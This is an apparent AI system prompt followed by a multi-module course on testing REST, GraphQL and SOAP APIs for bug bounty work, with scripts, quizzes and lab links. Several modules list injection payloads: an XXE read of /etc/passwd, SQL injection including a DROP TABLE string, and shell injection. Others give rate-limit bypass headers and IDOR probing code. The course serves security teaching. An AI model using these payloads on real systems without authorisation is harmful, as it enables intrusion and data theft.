You are an elite API Endpoint Analysis Learning AI, specializing in teaching comprehensive API security assessment. Your expertise focuses on educating bug bounty hunters about REST, GraphQL, and SOAP API testing methodologies, authentication mechanisms, and authorization testing.

Your mission is to guide aspiring security researchers through the complexities of API security, teaching them systematic approaches to API discovery, testing, and vulnerability identification while developing professional API assessment skills.

Key Learning Objectives:
- **API Architecture Understanding**: Learn REST, GraphQL, SOAP, and WebSocket API structures
- **Authentication Mechanisms**: Master token-based, OAuth, JWT, and API key authentication
- **Authorization Testing**: Understand role-based access control and permission testing
- **Input Validation**: Learn parameter fuzzing, injection testing, and sanitization assessment
- **Rate Limiting Analysis**: Study throttling mechanisms and bypass techniques
- **Error Handling Assessment**: Identify information disclosure through error responses
- **GraphQL-Specific Security**: Master schema introspection, query complexity, and resolver testing

Advanced Learning Concepts:
- **API Discovery Techniques**: Learn automated and manual API endpoint enumeration
- **Request/Response Analysis**: Master HTTP method testing and header manipulation
- **Business Logic Testing**: Understand API workflow and state management
- **Concurrency Testing**: Learn race condition identification in API operations
- **API Versioning Security**: Assess version handling and backward compatibility
- **Third-Party API Integration**: Test external API consumption security
- **API Documentation Analysis**: Use OpenAPI/Swagger for comprehensive testing

Learning Process:
1. **API Fundamentals**: Understand different API types and communication patterns
2. **Discovery Methodology**: Learn systematic API endpoint identification
3. **Authentication Deep Dive**: Master various authentication scheme testing
4. **Authorization Assessment**: Practice privilege escalation and access control testing
5. **Input Validation**: Study parameter manipulation and injection techniques
6. **Business Logic Analysis**: Learn workflow testing and state manipulation
7. **Advanced API Security**: Explore modern API security challenges

Teaching Methodology:
- **API Type Breakdown**: Separate learning paths for REST, GraphQL, SOAP
- **Practical API Testing**: Hands-on exercises with real API endpoints
- **Tool Integration**: Master Burp Suite, Postman, and specialized API tools
- **Authentication Labs**: Practice testing various auth mechanisms
- **GraphQL Workshops**: Dedicated GraphQL security testing modules
- **Case Study Analysis**: Real-world API vulnerability examples
- **Security Mindset**: Develop attacker thinking for API exploitation

Output Format:
- **API Learning Modules**: Structured courses for different API types
- **Practical Exercises**: API testing labs with vulnerable applications
- **Authentication Tutorials**: Step-by-step auth mechanism testing guides
- **GraphQL Deep Dives**: Specialized GraphQL security learning units
- **Tool Workshops**: Comprehensive tool usage tutorials
- **Case Studies**: Real API vulnerability analysis and exploitation
- **Assessment Framework**: Knowledge checks and practical skill validation

Example Learning Query: "Teach me comprehensive API security testing from beginner to expert"

Ensure learning materials cover all API types, testing methodologies, and develop expert-level API security assessment skills.

---

## Module 1: REST API Security Fundamentals

### 1.1 REST API Architecture Review

REST (Representational State Transfer) APIs use HTTP methods to perform operations on resources. Understanding the architecture is essential for security testing.

**Core HTTP Methods and Their Security Implications:**

| Method | Purpose | Security Concern |
|--------|---------|-----------------|
| GET | Retrieve resource | Information disclosure, IDOR |
| POST | Create resource | Mass assignment, injection |
| PUT | Replace resource | Unauthorized modification |
| PATCH | Partial update | Bypass validation |
| DELETE | Remove resource | Unauthorized deletion |
| OPTIONS | CORS preflight | Misconfigured CORS |
| HEAD | Headers only | Information disclosure |

**REST API URL Structure:**
```
https://api.example.com/v1/users/123/profile
         |         |    |  |      |     |
      domain    version |  |   resource  |
                      path  resource   endpoint
```

### 1.2 HTTP Method Testing

Test each endpoint with all HTTP methods to discover hidden functionality:

```bash
# Test all HTTP methods on an endpoint
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
    echo "Testing $method on /api/users"
    curl -s -o /dev/null -w "%{http_code}" -X $method https://target.com/api/users
    echo ""
done
```

**Python Script for Method Testing:**
```python
import requests
from concurrent.futures import ThreadPoolExecutor

def test_method(url, method):
    try:
        resp = requests.request(method, url, timeout=10, allow_redirects=False)
        return f"{method}: {resp.status_code} ({len(resp.content)} bytes)"
    except Exception as e:
        return f"{method}: ERROR - {str(e)}"

def enumerate_methods(base_url, paths):
    methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD']
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for path in paths:
            for method in methods:
                url = f"{base_url}{path}"
                futures.append(executor.submit(test_method, url, method))
        
        for future in futures:
            result = future.result()
            if '200' in result or '201' in result or '204' in result:
                print(f"[+] {result}")

# Usage
enumerate_methods("https://api.target.com", [
    "/api/v1/users",
    "/api/v1/admin",
    "/api/v1/config",
    "/api/v1/health"
])
```

### 1.3 Header Analysis

Examine response headers for security information:

```python
import requests

def analyze_headers(url):
    resp = requests.get(url, timeout=10)
    security_headers = {
        'X-Frame-Options': 'Clickjacking protection',
        'X-Content-Type-Options': 'MIME sniffing protection',
        'Strict-Transport-Security': 'HSTS enforcement',
        'Content-Security-Policy': 'XSS/injection protection',
        'X-XSS-Protection': 'Legacy XSS protection',
        'Cache-Control': 'Caching security',
        'Pragma': 'Cache control',
        'X-Powered-By': 'Technology disclosure (BAD)',
        'Server': 'Server information (BAD)'
    }
    
    print(f"[*] Analyzing headers for: {url}")
    for header, description in security_headers.items():
        value = resp.headers.get(header)
        if value:
            print(f"[+] {header}: {value}")
        else:
            print(f"[-] {header}: MISSING - {description}")

analyze_headers("https://api.target.com/v1/users")
```

### 1.4 Content-Type Negotiation

Test how the API handles different Content-Type headers:

```bash
# Test JSON
curl -X POST https://api.target.com/v1/users \
  -H "Content-Type: application/json" \
  -d '{"name":"test"}'

# Test XML
curl -X POST https://api.target.com/v1/users \
  -H "Content-Type: application/xml" \
  -d '<user><name>test</name></user>'

# Test form-data
curl -X POST https://api.target.com/v1/users \
  -H "Content-Type: multipart/form-data" \
  -F "name=test"

# Test with no content type
curl -X POST https://api.target.com/v1/users \
  -d 'name=test'
```

### 1.5 Practical Exercise: REST API Reconnaissance

**Objective:** Discover and map all API endpoints on a target application.

**Steps:**
1. Use browser DevTools Network tab to capture API calls
2. Use Burp Suite Proxy to intercept mobile app traffic
3. Analyze JavaScript bundles for API endpoint strings
4. Check API documentation endpoints (/swagger, /api-docs)
5. Use ffuf for endpoint discovery with common wordlists

```bash
# Discover API documentation
ffuf -u https://target.com/FUZZ -w api-docs-wordlist.txt -mc 200

# Common API documentation paths
echo "/swagger" >> api-docs.txt
echo "/api-docs" >> api-docs.txt
echo "/v1/api-docs" >> api-docs.txt
echo "/v2/api-docs" >> api-docs.txt
echo "/swagger-ui" >> api-docs.txt
echo "/swagger/index.html" >> api-docs.txt
echo "/openapi.json" >> api-docs.txt
echo "/openapi.yaml" >> api-docs.txt
```

---

## Module 2: GraphQL Security Testing

### 2.1 GraphQL Fundamentals

GraphQL is a query language for APIs that provides a complete description of the data. It uses a single endpoint with different queries.

**GraphQL vs REST Security Differences:**

| Aspect | REST | GraphQL |
|--------|------|---------|
| Endpoints | Multiple | Single |
| Data fetching | Server-defined | Client-defined |
| Introspection | N/A | Often enabled |
| Query complexity | N/A | Can be exploited |
| Rate limiting | Per-endpoint | Per-query |

### 2.2 Schema Introspection

Introspection allows querying the entire GraphQL schema. If enabled, it reveals all types, queries, mutations, and fields.

**Introspection Query:**
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
          ofType { name kind }
        }
        args {
          name
          type { name kind }
        }
      }
    }
    directives {
      name
      locations
      args {
        name
        type { name kind }
      }
    }
  }
}
```

**Python Introspection Script:**
```python
import requests
import json

def introspect_graphql(endpoint, headers=None):
    query = """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        types {
          name
          kind
          fields {
            name
            type { name kind ofType { name kind } }
            args { name type { name kind } }
          }
        }
      }
    }
    """
    
    resp = requests.post(
        endpoint,
        json={"query": query},
        headers=headers or {"Content-Type": "application/json"},
        timeout=30
    )
    
    if resp.status_code == 200:
        data = resp.json()
        if 'data' in data and data['data']['__schema']:
            print("[+] Introspection enabled!")
            schema = data['data']['__schema']
            
            print(f"\n[*] Query Type: {schema['queryType']['name']}")
            if schema.get('mutationType'):
                print(f"[*] Mutation Type: {schema['mutationType']['name']}")
            
            print("\n[*] Types found:")
            for t in schema['types']:
                if not t['name'].startswith('__'):
                    print(f"    - {t['name']} ({t['kind']})")
                    if t.get('fields'):
                        for f in t['fields']:
                            print(f"        .{f['name']}")
            return data
    else:
        print(f"[-] Introspection failed: {resp.status_code}")
    return None

# Usage
introspect_graphql("https://target.com/graphql")
```

### 2.3 GraphQL Query Complexity Attacks

GraphQL queries can be crafted to consume excessive server resources through nested queries.

**Nested Query Attack:**
```graphql
query {
  users {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                name
              }
            }
          }
        }
      }
    }
  }
}
```

**Query Depth Limiting Bypass:**
```graphql
# Fragment-based depth bypass
query {
  ...A
}

fragment A on Query {
  users {
    ...B
  }
}

fragment B on User {
  posts {
    ...C
  }
}

fragment C on Post {
  comments {
    name
  }
}
```

### 2.4 GraphQL Authorization Testing

Test for broken access control in GraphQL resolvers:

```graphql
# Test if non-admin can access admin fields
query {
  user(id: "1") {
    name
    email
    isAdmin
    internalId
    ssn
  }
}

# Test mutation authorization
mutation {
  updateUser(id: "other-user", input: { role: "admin" }) {
    id
    role
  }
}
```

**Authorization Bypass Script:**
```python
import requests

def test_graphql_auth(endpoint, query, valid_token=None):
    headers = {"Content-Type": "application/json"}
    
    # Test without authentication
    resp = requests.post(endpoint, json={"query": query}, headers=headers)
    if resp.status_code == 200 and 'errors' not in resp.json():
        print("[+] CRITICAL: Query works without authentication!")
        return True
    
    # Test with valid token but different user context
    if valid_token:
        headers["Authorization"] = f"Bearer {valid_token}"
        resp = requests.post(endpoint, json={"query": query}, headers=headers)
        if resp.status_code == 200 and 'errors' not in resp.json():
            print("[+] WARNING: Query works with valid token (check authorization)")
    
    return False

# Test queries
test_graphql_auth(
    "https://target.com/graphql",
    '{ admin { users { email password_hash } } }'
)
```

### 2.5 Practical Exercise: GraphQL Security Assessment

**Objective:** Perform a complete GraphQL security assessment.

**Steps:**
1. Discover GraphQL endpoint (/graphql, /graphiql, /playground)
2. Test introspection availability
3. Map all queries, mutations, and subscriptions
4. Test for injection in GraphQL arguments
5. Test authorization on each resolver
6. Check for query complexity limits
7. Test subscription security (WebSocket)

---

## Module 3: SOAP API Security

### 3.1 SOAP Fundamentals

SOAP (Simple Object Access Protocol) uses XML-based messaging with strict standards.

**SOAP Message Structure:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:usr="http://example.com/users">
  <soap:Header>
    <usr:AuthToken>token123</usr:AuthToken>
  </soap:Header>
  <soap:Body>
    <usr:GetUser>
      <usr:UserId>123</usr:UserId>
    </usr:GetUser>
  </soap:Body>
</soap:Envelope>
```

### 3.2 SOAP Security Testing

**WSDL Discovery and Analysis:**
```bash
# Common WSDL locations
https://target.com/service?wsdl
https://target.com/service.asmx?wsdl
https://target.com/api/soap?wsdl
https://target.com/Service?wsdl
```

**XML Injection Testing:**
```xml
<!-- XXE Injection in SOAP -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser>
      <UserId>&xxe;</UserId>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

**SOAP Action Testing:**
```bash
# Test for SOAP action manipulation
curl -X POST https://target.com/service \
  -H "Content-Type: text/xml" \
  -H 'SOAPAction: "GetUser"' \
  -d @payload.xml

# Test with empty SOAP action
curl -X POST https://target.com/service \
  -H "Content-Type: text/xml" \
  -H 'SOAPAction: ""' \
  -d @payload.xml
```

### 3.3 SOAP vs REST Security Comparison

| Vulnerability | REST | SOAP |
|---------------|------|------|
| XXE | Less common | More common |
| Injection | JSON/XML | XML only |
| Auth testing | Various | WS-Security |
| WSDL exposure | N/A | Common |
| Complexity | Simpler | More complex |

---

## Module 4: API Discovery Techniques

### 4.1 Passive Discovery

Gather API information without sending requests to the target.

**JavaScript Analysis:**
```python
import re
import requests

def extract_api_endpoints(js_url):
    resp = requests.get(js_url, timeout=30)
    patterns = [
        r'["\']/(api|v[0-9]+)/[a-zA-Z/]+["\']',
        r'fetch\(["\']([^"\']+)["\']',
        r'axios\.[a-z]+\(["\']([^"\']+)["\']',
        r'["\']https?://api\.[^"\']+["\']',
    ]
    
    endpoints = set()
    for pattern in patterns:
        matches = re.findall(pattern, resp.text)
        endpoints.update(matches)
    
    return endpoints

# Usage
for js_file in ["app.js", "main.js", "bundle.js"]:
    endpoints = extract_api_endpoints(f"https://target.com/{js_file}")
    for ep in endpoints:
        print(f"[+] Found: {ep}")
```

### 4.2 Active Discovery

Send requests to discover API endpoints.

**Directory Brute-Force:**
```bash
# API-specific wordlist
ffuf -u https://target.com/api/FUZZ -w api-wordlist.txt -mc 200,201,204

# Version discovery
for v in v1 v2 v3; do
    curl -s -o /dev/null -w "%{v}: %{http_code}\n" "https://target.com/$v/users"
done
```

**Subdomain API Discovery:**
```bash
# Find API subdomains
subfinder -d target.com | grep -i api
# api.target.com
# api-v2.target.com
# graphql.target.com
# soap.target.com
```

### 4.3 API Documentation Exploitation

**Swagger/OpenAPI Discovery:**
```python
def find_api_docs(base_url):
    paths = [
        "/swagger.json",
        "/swagger.yaml",
        "/api-docs",
        "/v1/api-docs",
        "/v2/api-docs",
        "/openapi.json",
        "/openapi.yaml",
        "/swagger-ui.html",
        "/swagger-ui/",
        "/redoc",
        "/docs",
        "/api/docs",
        "/api/swagger",
    ]
    
    for path in paths:
        url = f"{base_url}{path}"
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            print(f"[+] API docs found: {url}")
            return resp.json() if 'json' in resp.headers.get('content-type', '') else resp.text
    return None
```

### 4.4 Practical Exercise: API Endpoint Discovery

**Objective:** Discover all API endpoints on a target application.

**Tools Required:** ffuf, subfinder, httpx, katana, burpsuite

**Methodology:**
1. Subdomain enumeration for api/graphql/soap subdomains
2. JavaScript file analysis for endpoint strings
3. API documentation discovery
4. Directory brute-force with API wordlists
5. Traffic interception from web/mobile apps

---

## Module 5: Authentication Testing

### 5.1 API Key Security

**Common API Key Vulnerabilities:**
- Keys in URLs (logged in server access logs)
- Weak key generation (predictable patterns)
- No key rotation
- Overly permissive key scopes
- Keys in client-side code

**API Key Testing Script:**
```python
def test_api_key_security(endpoint, api_key):
    headers = {"Authorization": f"Bearer {api_key}"}
    
    # Test 1: Key in URL
    resp = requests.get(f"{endpoint}?api_key={api_key}")
    if resp.status_code == 200:
        print("[!] API key accepted in URL - security risk")
    
    # Test 2: Test key scope
    admin_endpoints = ["/admin", "/users", "/config"]
    for ep in admin_endpoints:
        resp = requests.get(f"{endpoint}{ep}", headers=headers)
        if resp.status_code == 200:
            print(f"[!] API key works on admin endpoint: {ep}")
    
    # Test 3: Test key without IP restriction
    # (use proxy to change source IP)
    print("[*] Test key from different IP to check IP restrictions")
```

### 5.2 Token-Based Authentication Testing

**Bearer Token Analysis:**
```python
import jwt
import base64
import json

def analyze_token(token):
    try:
        # Decode without verification
        payload = jwt.decode(token, options={"verify_signature": False})
        
        print("[*] Token Payload:")
        for key, value in payload.items():
            print(f"    {key}: {value}")
        
        # Check for sensitive data
        sensitive_keys = ['password', 'secret', 'key', 'token', 'ssn']
        for key in payload:
            if any(s in key.lower() for s in sensitive_keys):
                print(f"[!] SENSITIVE DATA IN TOKEN: {key}")
        
        # Check expiration
        if 'exp' in payload:
            import datetime
            exp = datetime.datetime.fromtimestamp(payload['exp'])
            if exp < datetime.datetime.now():
                print("[!] Token is expired!")
            else:
                print(f"[*] Token expires: {exp}")
        
        return payload
    except jwt.DecodeError:
        print("[-] Invalid token format")
        return None
```

### 5.3 OAuth API Testing

**Authorization Code Flow Testing:**
```python
def test_oauth_endpoints(base_url):
    endpoints = [
        "/oauth/authorize",
        "/oauth/token",
        "/oauth/revoke",
        "/oauth/userinfo",
        "/.well-known/openid-configuration",
    ]
    
    for ep in endpoints:
        resp = requests.get(f"{base_url}{ep}", timeout=10)
        print(f"{ep}: {resp.status_code}")
```

### 5.4 Practical Exercise: Authentication Mechanism Testing

**Objective:** Test all authentication mechanisms on a target API.

**Test Cases:**
1. Test API key in headers vs URL
2. Test JWT algorithm confusion
3. Test OAuth redirect_uri validation
4. Test token expiration enforcement
5. Test scope restrictions

---

## Module 6: Authorization Testing

### 6.1 Object-Level Authorization (IDOR)

**IDOR Testing Methodology:**
```python
def test_idor(base_url, valid_token, resource_id):
    headers = {"Authorization": f"Bearer {valid_token}"}
    
    # Get authorized resource
    resp = requests.get(f"{base_url}/api/users/{resource_id}", headers=headers)
    if resp.status_code == 200:
        print(f"[+] Can access own resource: {resource_id}")
        
        # Test IDOR by incrementing ID
        for i in range(resource_id - 5, resource_id + 5):
            if i != resource_id:
                resp = requests.get(f"{base_url}/api/users/{i}", headers=headers)
                if resp.status_code == 200:
                    print(f"[!] IDOR: Can access other user's resource: {i}")
        
        # Test with different parameter names
        param_names = ['id', 'user_id', 'userId', 'account_id', 'accountId']
        for param in param_names:
            resp = requests.get(f"{base_url}/api/users?{param}={resource_id + 1}", headers=headers)
            if resp.status_code == 200:
                print(f"[!] IDOR via parameter: {param}")
```

### 6.2 Function-Level Authorization

**Admin Function Discovery:**
```python
def test_admin_functions(base_url, user_token):
    headers = {"Authorization": f"Bearer {user_token}"}
    
    admin_paths = [
        "/api/admin/users",
        "/api/admin/config",
        "/api/admin/stats",
        "/api/internal/users",
        "/api/system/config",
    ]
    
    for path in admin_paths:
        resp = requests.get(f"{base_url}{path}", headers=headers)
        if resp.status_code == 200:
            print(f"[!] Admin function accessible: {path}")
```

### 6.3 Practical Exercise: Authorization Testing

**Objective:** Test authorization mechanisms across the entire API.

**Methodology:**
1. Create two test accounts with different roles
2. Enumerate all endpoints accessible to each role
3. Test cross-user resource access (IDOR)
4. Test privilege escalation via parameter manipulation
5. Test horizontal and vertical access control

---

## Module 7: Rate Limiting and Throttling

### 7.1 Rate Limit Detection

**Testing Rate Limits:**
```python
import time
import requests

def test_rate_limit(endpoint, headers, threshold=100):
    start = time.time()
    success_count = 0
    
    for i in range(threshold):
        resp = requests.get(endpoint, headers=headers)
        if resp.status_code == 200:
            success_count += 1
        
        # Check for rate limit response
        if resp.status_code == 429:
            print(f"[+] Rate limit triggered after {i+1} requests")
            print(f"    Retry-After: {resp.headers.get('Retry-After')}")
            print(f"    X-RateLimit-Limit: {resp.headers.get('X-RateLimit-Limit')}")
            return True
        
        # Check for captcha/blocking
        if resp.status_code == 403:
            print(f"[+] Blocked after {i+1} requests")
            return True
    
    elapsed = time.time() - start
    print(f"[-] No rate limit detected in {threshold} requests ({elapsed:.2f}s)")
    print(f"    Success rate: {success_count}/{threshold}")
    return False
```

### 7.2 Rate Limit Bypass Techniques

```python
def test_rate_limit_bypass(base_url, endpoint, token):
    headers = {"Authorization": f"Bearer {token}"}
    
    bypasses = [
        # IP rotation (via proxy)
        {"X-Forwarded-For": "1.1.1.1"},
        {"X-Real-IP": "2.2.2.2"},
        {"X-Originating-IP": "3.3.3.3"},
        {"X-Client-IP": "4.4.4.4"},
        {"X-Forwarded-Host": "5.5.5.5"},
        # Case variation
        {"authorization": f"Bearer {token}"},
        # Header pollution
        {"Authorization": f"Bearer {token}", "authorization": "Bearer invalid"},
    ]
    
    for bypass_headers in bypasses:
        test_headers = {**headers, **bypass_headers}
        resp = requests.post(f"{base_url}{endpoint}", headers=test_headers)
        if resp.status_code != 429:
            print(f"[+] Rate limit bypass: {bypass_headers}")
```

### 7.3 Practical Exercise: Rate Limiting Assessment

**Objective:** Test rate limiting on authentication and sensitive endpoints.

**Test Cases:**
1. Login endpoint brute-force protection
2. Password reset rate limiting
3. API key generation limits
4. Data export rate limiting
5. Search/query rate limiting

---

## Module 8: Input Validation and Injection

### 8.1 Parameter Fuzzing

**Systematic Parameter Testing:**
```python
def fuzz_parameters(base_url, endpoint, token):
    headers = {"Authorization": f"Bearer {token}"}
    
    payloads = {
        "sql": ["' OR 1=1--", "1; DROP TABLE users--", "' UNION SELECT null--"],
        "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
        "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>"],
        "xxe": ["<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"],
        "command": ["; ls", "| cat /etc/passwd", "$(whoami)"],
    }
    
    params = ["id", "search", "query", "name", "file", "path", "url"]
    
    for param in params:
        for injection_type, payloads_list in payloads.items():
            for payload in payloads_list:
                data = {param: payload}
                resp = requests.post(f"{base_url}{endpoint}", json=data, headers=headers)
                
                # Check for injection indicators
                if injection_type == "ssti" and "49" in resp.text:
                    print(f"[!] SSTI in parameter: {param}")
                elif injection_type == "xss" and payload in resp.text:
                    print(f"[!] XSS in parameter: {param}")
```

### 8.2 Content-Type Injection

```python
def test_content_type_injection(endpoint, token):
    headers = {"Authorization": f"Bearer {token}"}
    
    content_types = [
        "application/json",
        "application/xml",
        "text/xml",
        "application/x-www-form-urlencoded",
        "multipart/form-data",
    ]
    
    payload = {"name": "test", "role": "admin"}
    
    for ct in content_types:
        headers["Content-Type"] = ct
        
        if "json" in ct:
            data = payload
        elif "xml" in ct:
            data = "<user><name>test</name><role>admin</role></user>"
        elif "form" in ct:
            data = "name=test&role=admin"
        
        resp = requests.post(endpoint, data=data, headers=headers)
        print(f"{ct}: {resp.status_code}")
```

### 8.3 Practical Exercise: Input Validation Testing

**Objective:** Test input validation and injection vulnerabilities.

**Test Cases:**
1. SQL injection in search parameters
2. XSS in user profile fields
3. SSTI in email templates
4. Command injection in file upload parameters
5. XXE in XML import functionality

---

## Module 9: Error Handling and Information Disclosure

### 9.1 Error Message Analysis

**Test Error Conditions:**
```python
def test_error_disclosure(base_url, endpoint, token):
    headers = {"Authorization": f"Bearer {token}"}
    
    error_triggers = [
        # Invalid input
        {"data": "invalid", "desc": "Invalid data"},
        # Missing required fields
        {"data": {}, "desc": "Missing fields"},
        # Special characters
        {"data": {"name": "<>\"'&"}, "desc": "Special chars"},
        # Very long input
        {"data": {"name": "A" * 10000}, "desc": "Long input"},
        # Null values
        {"data": {"name": None}, "desc": "Null value"},
        # Array instead of string
        {"data": {"name": ["array"]}, "desc": "Array value"},
    ]
    
    for trigger in error_triggers:
        resp = requests.post(f"{base_url}{endpoint}", json=trigger["data"], headers=headers)
        
        if resp.status_code >= 500:
            print(f"[!] Server error: {trigger['desc']}")
            # Check for stack traces
            if "stack" in resp.text.lower() or "trace" in resp.text.lower():
                print(f"    Stack trace disclosed!")
        elif resp.status_code == 400:
            # Check for detailed validation errors
            try:
                error = resp.json()
                if "message" in error and len(error["message"]) > 50:
                    print(f"[!] Detailed error: {error['message']}")
            except:
                pass
```

### 9.2 Debug Mode Detection

```python
def test_debug_mode(base_url):
    # Test various debug indicators
    tests = [
        "/debug",
        "/debug/vars",
        "/debug/pprof",
        "/trace.axd",
        "/elmah.axd",
        "/actuator",
        "/actuator/env",
        "/actuator/health",
        "/metrics",
    ]
    
    for path in tests:
        resp = requests.get(f"{base_url}{path}", timeout=10)
        if resp.status_code == 200:
            print(f"[!] Debug endpoint accessible: {path}")
```

### 9.3 Practical Exercise: Error Handling Assessment

**Objective:** Identify information disclosure through error responses.

**Test Cases:**
1. Trigger various error conditions
2. Check for stack trace disclosure
3. Test debug endpoint accessibility
4. Verify error message verbosity
5. Test application behavior under error conditions

---

## Module 10: Advanced API Security Testing

### 10.1 Business Logic Testing

**State Manipulation:**
```python
def test_business_logic(base_url, token):
    headers = {"Authorization": f"Bearer {token}"}
    
    # Test order amount manipulation
    order = {
        "product_id": "123",
        "quantity": 1,
        "price": 99.99,
        "discount_code": "SAVE10"
    }
    
    # Negative quantity
    order["quantity"] = -1
    resp = requests.post(f"{base_url}/api/orders", json=order, headers=headers)
    print(f"Negative quantity: {resp.status_code}")
    
    # Negative price
    order["quantity"] = 1
    order["price"] = -99.99
    resp = requests.post(f"{base_url}/api/orders", json=order, headers=headers)
    print(f"Negative price: {resp.status_code}")
    
    # Invalid discount code
    order["price"] = 99.99
    order["discount_code"] = "INVALID"
    resp = requests.post(f"{base_url}/api/orders", json=order, headers=headers)
    print(f"Invalid discount: {resp.status_code}")
```

### 10.2 Concurrency Testing

**Race Condition Detection:**
```python
import concurrent.futures
import requests

def test_race_condition(endpoint, method, data, token, threads=10):
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    
    results = []
    
    def make_request():
        resp = requests.request(method, endpoint, json=data, headers=headers)
        return resp.status_code
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(make_request) for _ in range(threads)]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]
    
    # Analyze results
    success_count = results.count(200)
    if success_count > 1:
        print(f"[!] Race condition possible: {success_count} successful requests")
    
    return results
```

### 10.3 API Versioning Security

```python
def test_versioning(base_url, token):
    headers = {"Authorization": f"Bearer {token}"}
    
    versions = ["/v1", "/v2", "/v3", "/api/v1", "/api/v2"]
    
    for version in versions:
        resp = requests.get(f"{base_url}{version}/users", headers=headers)
        if resp.status_code == 200:
            print(f"[+] Version accessible: {version}")
            
            # Check if old versions have weaker security
            resp2 = requests.get(f"{base_url}{version}/admin", headers=headers)
            if resp2.status_code == 200:
                print(f"[!] Admin accessible in version: {version}")
```

### 10.4 Practical Exercise: Advanced API Testing

**Objective:** Perform advanced security testing on API endpoints.

**Methodology:**
1. Business logic bypass testing
2. Race condition identification
3. API version security comparison
4. Mass assignment testing
5. Server-side request forgery (SSRF) via API parameters

---

## Assessment Questions

### Knowledge Check

1. **What is the primary security advantage of introspection being disabled in GraphQL?**
   - A) Faster query execution
   - B) Prevents schema discovery by attackers
   - C) Reduces server load
   - D) Improves API documentation

2. **Which HTTP method is most commonly associated with CSRF attacks?**
   - A) GET
   - B) POST
   - C) PUT
   - D) DELETE

3. **What is the key difference between IDOR and privilege escalation?**
   - A) IDOR is horizontal, privilege escalation is vertical
   - B) They are the same thing
   - C) IDOR involves object references, privilege escalation involves role changes
   - D) IDOR only affects REST APIs

4. **Rate limiting bypass techniques typically target:**
   - A) Client-side validation
   - B) Server-side IP identification
   - C) Database queries
   - D) Frontend JavaScript

5. **Which Content-Type is most likely to trigger XXE vulnerabilities?**
   - A) application/json
   - B) application/xml
   - C) text/html
   - D) application/x-www-form-urlencoded

### Practical Assessment

**Scenario:** You discover a REST API at https://api.target.com/v2/. Perform a security assessment.

**Tasks:**
1. Document 10 API endpoints through discovery
2. Test authorization on 3 endpoints using different user roles
3. Identify 1 injection vulnerability
4. Document rate limiting behavior on authentication endpoints
5. Assess error handling for information disclosure

---

## Further Reading

### Resources
- OWASP API Security Top 10: https://owasp.org/www-project-api-security/
- GraphQL Security Best Practices: https://graphql.org/learn/security/
- REST Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html
- API Security Testing Guide: https://portswigger.net/web-security/api-security

### Tools
- Burp Suite Extension: InQL (GraphQL testing)
- Postman: API testing and collection management
- ffuf: Fast web fuzzer
- kiterunner: API endpoint discovery
- Arjun: Parameter discovery

### Practice Platforms
- DVGA (Damn Vulnerable GraphQL Application)
- crAPI (Completely Ridiculous API)
- VAmPI (Vulnerable API)
- OWASP WebGoat API
